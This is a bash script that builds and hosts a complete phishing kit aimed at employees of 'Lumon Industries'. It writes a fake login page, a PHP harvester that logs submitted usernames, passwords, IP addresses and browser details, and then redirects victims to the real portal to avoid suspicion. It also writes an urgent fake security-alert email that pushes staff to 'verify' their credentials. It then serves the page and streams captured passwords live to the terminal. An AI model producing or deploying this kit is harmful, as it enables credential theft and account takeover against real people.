#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING SITE HOST                      ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Load environment variables
if [ -f .env ]; then
    source .env
    echo -e "${YELLOW}[INFO]${NC} Loaded configuration from .env"
else
    echo -e "${RED}[ERROR]${NC} .env file not found. Creating from example..."
    cp .env.example .env
    echo -e "${YELLOW}[INFO]${NC} Created .env from example. Please edit it with your details:"
    echo -e "nano .env"
    exit 1
fi

# Create phishing site directory if it doesn't exist
mkdir -p phishing_site
cd phishing_site

# Create login page
echo -e "${YELLOW}[INFO]${NC} Creating phishing login page..."
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lumon Industries - Employee Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            text-align: center;
            color: #003366;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002244;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/200x60?text=Lumon+Industries" alt="Lumon Industries">
        </div>
        <h2>Employee Portal Login</h2>
        <form action="credentials.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            &copy; 2023 Lumon Industries. All rights reserved.
        </div>
    </div>
</body>
</html>
EOF

# Create credential capture script
echo -e "${YELLOW}[INFO]${NC} Creating credential capture script..."
cat > credentials.php << 'EOF'
<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Try to capture credentials regardless of field names
    foreach ($_POST as $key => $value) {
        // Look for common username/email field names
        if (stripos($key, 'user') !== false || 
            stripos($key, 'email') !== false || 
            stripos($key, 'login') !== false || 
            stripos($key, 'id') !== false || 
            stripos($key, 'account') !== false) {
            $username = $value;
        }
        
        // Look for common password field names
        if (stripos($key, 'pass') !== false || 
            stripos($key, 'pwd') !== false || 
            stripos($key, 'secret') !== false) {
            $password = $value;
        }
    }
    
    // If we didn't find specific fields, log all POST data
    $all_post_data = '';
    if (empty($username) && empty($password)) {
        foreach ($_POST as $key => $value) {
            $all_post_data .= "$key: $value\n";
            
            // Make a best guess about which fields might be username/password
            if (empty($username) && !empty($value)) {
                $username = $value; // First non-empty value might be username
                continue;
            }
            if (empty($password) && !empty($value) && $value != $username) {
                $password = $value; // Second non-empty value might be password
            }
        }
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    if (!empty($all_post_data)) {
        $log_entry .= "\nAll POST data:\n$all_post_data";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // Display captured credentials in real-time in the terminal
    echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
    
    // Redirect to a legitimate site (to avoid suspicion)
    header('Location: https://portal.lumoninc.com');
    exit;
}
?>
EOF

# Go back to parent directory
cd ..

# Create HTML email template
echo -e "${YELLOW}[INFO]${NC} Creating HTML email template..."
cat > html_email_template.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Urgent: Account Security Verification Required</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
        <!-- HEADER WITH LOGO -->
        <tr>
            <td align="center" bgcolor="#003366" style="padding: 20px 0;">
                <img src="https://via.placeholder.com/180x60?text=Lumon+Industries" alt="Lumon Industries" width="180" style="display: block;">
            </td>
        </tr>
        
        <!-- CONTENT AREA -->
        <tr>
            <td bgcolor="#ffffff" style="padding: 40px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
                            Urgent: Security Alert - Immediate Action Required
                        </td>
                    </tr>
                    <tr>
                        <td style="padding: 20px 0;">
                            <p>Dear Valued Employee,</p>
                            
                            <p>The IT Security department has detected multiple unauthorized access attempts on your company account. According to our logs, these attempts originated from an unrecognized device.</p>
                            
                            <p>As part of our updated security protocols, <strong>you must verify your account credentials within the next 24 hours</strong> to maintain access to all Lumon Industries systems.</p>
                            
                            <p>This verification is mandatory according to our new company-wide security policy.</p>
                        </td>
                    </tr>
                    <tr>
                        <td align="center" style="padding: 30px 0;">
                            <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" bgcolor="#003366" style="border-radius: 4px;">
                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact the IT Security team at security@mail.lumoninc.com.</p>
                            
                            <p>Failure to verify your account within the specified timeframe may result in temporary account suspension until proper identity verification can be completed.</p>
                            
                            <p>Thank you for your prompt attention to this matter.</p>
                            
                            <p>Regards,<br>
                            Lumon Industries IT Security Team</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        
        <!-- FOOTER -->
        <tr>
            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #666666; font-size: 12px;">
                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
                            <p>&copy; 2023 Lumon Industries. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
EOF

# Start PHP server and monitor for credentials in one step
echo -e "${GREEN}[STATUS]${NC} Starting the phishing web server with real-time credential capture..."
echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."

# Use a signal trap to clean up child processes when the script is terminated
trap 'kill $(jobs -p) 2>/dev/null' EXIT

cd phishing_site

# Display real-time credentials 
tail -f captured_credentials.txt 2>/dev/null &

# Start PHP server (will run until Ctrl-C)
if [ "$EUID" -eq 0 ]; then
    # Running as root, try port 80
    php -S 0.0.0.0:80
else
    # Not running as root, suggest sudo
    echo -e "${YELLOW}[WARNING]${NC} Not running as root. For port 80, run with: sudo $0"
    echo -e "${YELLOW}[INFO]${NC} Using fallback port 8080..."
    php -S 0.0.0.0:8080
fi 